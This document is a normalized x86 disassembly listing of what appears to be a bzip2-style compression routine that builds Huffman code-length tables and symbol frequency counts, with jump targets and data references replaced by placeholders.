add ecx [ edx ]
inc edi
cmp ecx [ ebp - 0x28 ]
mov [ ebp - 0x40 ] ecx
jl r-xdata
cmp [ esi + 0x268 ] 0x3
jl r-xdata
lea edx [ eax + 0x31 ]
cmp edx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x2c ] edx
jl r-xdata
mov edx [ ebp - 0x3c ]
lea eax [ esi + 0x9324 ]
lea ecx [ esi + 0xc994 ]
mov [ ebp - 0x28 ] edx
cmp [ ebp - 0x3c ] 0x0
jle r-xdata
xor eax eax
cmp [ ebp - 0x3c ] eax
jle r-xdata
fild [ ebp - 0x40 ]
push ecx
push ecx
fmul [ r--data ]
fidiv [ esi + 0x274 ]
fstp [ esp ]
push [ ebp - 0x40 ]
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x34 ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
mov ecx [ ebp - 0x40 ]
add esp 0x20
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x3c ]
dec eax
cmp edi eax
jge r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
cdq
and edx 0x7
add eax edx
sar eax 0x3
push eax
mov eax [ ebp - 0x34 ]
inc eax
push eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
xor edi edi
add esp 0x10
cmp [ ebp - 0x30 ] edi
jle r-xdata
mov ecx [ ebp - 0x30 ]
test ecx ecx
jle r-xdata
dec ecx
mov [ ebp - 0x2c ] ecx
movzx edx [ eax + 0x102 ]
movzx edi [ eax ]
shl edx 0x10
or edx edi
mov [ ecx - 0x4 ] edx
movzx edx [ eax + 0x306 ]
movzx edi [ eax + 0x204 ]
shl edx 0x10
or edx edi
mov [ ecx ] edx
movzx edx [ eax + 0x50a ]
movzx edi [ eax + 0x408 ]
shl edx 0x10
or edx edi
mov [ ecx + 0x4 ] edx
inc eax
add ecx 0x10
dec [ ebp - 0x28 ]
jne r-xdata
dec [ ebp - 0x34 ]
sub [ ebp - 0x2c ] 0x102
inc [ ebp - 0xc ]
sub [ ebp - 0x20 ] ecx
inc edi
cmp [ ebp - 0x34 ] 0x0
mov [ ebp - 0x24 ] edi
jg r-xdata
cmp eax [ ebp - 0x24 ]
jl r-xdata
mov eax [ ebp - 0xc ]
and eax 0x80000001
jns r-xdata
inc [ ebp - 0x34 ]
cmp [ ebp - 0x34 ] 0x4
jl r-xdata
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x30 ]
lea edi [ esi + 0xb160 ]
mov [ ebp - 0xc ] eax
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
pop ecx
pop ecx
push [ ebp + edi * 4 - 0x5c ]
push r--data
call sub_100273c7
add eax 0x40
push eax
call sub_1002757c
add esp 0xc
inc edi
cmp edi [ ebp - 0x30 ]
jl r-xdata
cmp [ ebp - 0x30 ] 0x6
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
lea edi [ ebp - 0x18 ]
[ edi ]
adc ecx ecx
[ edi ]
mov eax [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
cdq
idiv [ ebp - 0x34 ]
mov edi [ ebp - 0x24 ]
xor ecx ecx
dec edi
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x28 ] eax
test eax eax
jle r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0xf
cmp eax edi
jg r-xdata
cmp eax 0x1
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x30 ] 0x8
jl r-xdata
push [ ebp - 0x3c ]
mov ecx edi
push [ ebp - 0x28 ]
call sub_100224b4
add [ ebp - 0x28 ] 0x102
pop ecx
add edi 0x408
dec [ ebp - 0xc ]
pop ecx
jne r-xdata
cmp eax [ ebp - 0x2c ]
mov ecx eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx eax
inc ecx
cmp ecx 0x32
jne r-xdata
mov edx [ ebp - 0x2c ]
mov [ edx + eax ] 0x0
jmp r-xdata
sub ecx [ esi + edi * 4 + 0x278 ]
dec edi
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x40 ]
cmp ecx 0x8000
jge r-xdata
push 0xbba
jmp r-xdata
mov [ ebp - 0x24 ] ecx
jle r-xdata
mov eax [ ebp - 0x24 ]
lea edi [ ebx + eax * 2 ]
movzx eax [ edi ]
movzx edi [ edi + 0x2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
movzx ecx ax
lea eax [ ecx + 0xc99 ]
shl eax 0x4
mov eax [ eax + esi ]
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
shl ecx 0x4
lea edx [ ecx + esi ]
mov ecx [ edx + 0xc994 ]
add ecx [ edi + 0xc994 ]
mov edx [ edx + 0xc998 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x6 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x8 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xa ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xc ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0xe ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x10 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x12 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x14 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x16 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x18 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x1e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x20 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x22 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x24 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x26 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x28 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x2e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x30 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x32 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x34 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x36 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x38 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x3e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x40 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x42 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x44 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x46 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x48 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x4e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x50 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x52 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x54 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x56 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x58 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5a ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5c ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x5e ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0x24 ]
movzx edi [ ebx + edi * 2 + 0x60 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov edi [ ebp - 0xc ]
movzx edi [ ebx + edi * 2 ]
mov [ ebp - 0x20 ] edi
add edi 0xc99
shl edi 0x4
add eax [ edi + esi ]
mov edi [ ebp - 0x20 ]
shl edi 0x4
add edi esi
add ecx [ edi + 0xc994 ]
add edx [ edi + 0xc998 ]
mov [ ebp - 0x18 ] ax
shr eax 0x10
mov [ ebp - 0x14 ] cx
shr ecx 0x10
mov [ ebp - 0x10 ] dx
shr edx 0x10
mov [ ebp - 0x16 ] ax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x12 ] cx
mov [ ebp - 0xe ] dx
jmp r-xdata
inc eax
cmp eax [ ebp - 0x3c ]
jl r-xdata
push 0xbbb
jmp r-xdata
cmp ecx 0x4652
jg r-xdata
call sub_1001bf0e
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
movzx ecx [ ebx + ecx * 2 ]
jle r-xdata
and [ ebp - 0x20 ] 0x0
or ecx 0xffffffff
cmp [ ebp - 0x30 ] 0x0
mov [ ebp - 0x24 ] 0x3b9ac9ff
jle r-xdata
xor eax eax
cmp [ ebp - 0x30 ] eax
jle r-xdata
mov ecx [ ebp - 0x24 ]
inc ecx
cmp ecx [ ebp - 0x2c ]
movzx ecx cx
lea ecx [ ecx + esi + 0x9324 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x28 ] edx
inc [ ebp + ecx * 4 - 0x5c ]
mov edx [ ebp - 0x40 ]
inc [ ebp - 0x40 ]
cmp [ ebp - 0x30 ] 0x6
mov [ esi + edx + 0x680 ] cl
jne r-xdata
mov edx [ ebp - 0x20 ]
movzx edx [ ebp + edx * 2 - 0x18 ]
cmp edx [ ebp - 0x24 ]
jge r-xdata
test ecx ecx
jle r-xdata
mov [ ebp + eax - 0xc ] al
inc eax
cmp eax [ ebp - 0x30 ]
jl r-xdata
mov edx [ ebp - 0x20 ]
movzx di [ ecx ]
lea edx [ ebp + edx * 2 - 0x18 ]
add [ edx ] di
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
add ecx 0x102
cmp edx [ ebp - 0x30 ]
jl r-xdata
cmp eax [ ebp - 0x2c ]
jg r-xdata
mov edx [ ebp - 0x2c ]
sub edx eax
inc edx
cmp edx 0x32
jne r-xdata
inc [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0x30 ]
jl r-xdata
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x24 ] edx
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
lea edi [ esi + 0x4cd2 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x2c ]
mov ecx [ esi + 0x274 ]
inc eax
cmp eax ecx
mov [ ebp - 0x24 ] eax
jl r-xdata
add ecx 0x2c
imul ecx ecx 0x102
movzx edx [ ebx + eax * 2 ]
add ecx 0x2c
imul ecx ecx 0x102
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x6 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x8 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xa ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xc ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0xe ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x10 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x12 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x14 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x16 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x18 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x1e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x20 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x22 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x24 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x26 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x28 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x2e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x30 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x32 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x34 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x36 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x38 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x3e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x40 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x42 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x44 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x46 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x48 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x4e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x50 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x52 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x54 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x56 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x58 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5a ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5c ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx edx [ ebx + eax * 2 + 0x5e ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
movzx eax [ ebx + eax * 2 + 0x60 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
mov eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
add eax ecx
lea eax [ esi + eax * 4 ]
inc [ eax ]
jmp r-xdata
lea eax [ esi + 0x58 ]
xor ecx ecx
mov edi eax
lea eax [ esi + 0x9324 ]
mov [ ebp - 0x28 ] 0xffff9328
sub [ ebp - 0x28 ] esi
mov [ ebp - 0x2c ] eax
mov al [ ebp - 0x35 ]
mov [ edi ] cl
inc edi
dec [ ebp - 0x28 ]
mov [ ebp - 0xc ] al
jne r-xdata
mov al [ ebp - 0x35 ]
inc ecx
mov [ ebp - 0x41 ] al
lea eax [ ebp + ecx - 0xc ]
mov dl [ eax ]
mov [ ebp - 0x35 ] dl
mov dl [ ebp - 0x41 ]
mov [ eax ] dl
mov al [ edi - 0x4652 ]
cmp al [ ebp - 0x35 ]
jne r-xdata
movzx edx [ ebx + eax * 2 ]
add edx ecx
lea edx [ esi + edx * 4 ]
inc [ edx ]
inc eax
cmp eax [ ebp - 0x2c ]
